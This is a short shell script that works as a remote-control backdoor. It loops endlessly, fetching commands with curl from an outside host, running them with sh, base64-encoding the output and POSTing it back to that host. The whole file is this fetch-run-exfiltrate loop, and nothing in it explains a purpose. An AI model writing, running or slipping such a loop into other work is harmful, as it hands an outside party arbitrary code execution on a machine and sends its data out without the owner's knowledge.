set -eu
H=https://exf.infose.cz/

i=0
while :; do
        curl -s "${H}/$$-$i" | { sh | base64 -w0; echo; } | curl -X POST -s --data-binary @- --include "${H}/$$-p.$i"
        i=$(( $i + 1 ))
done
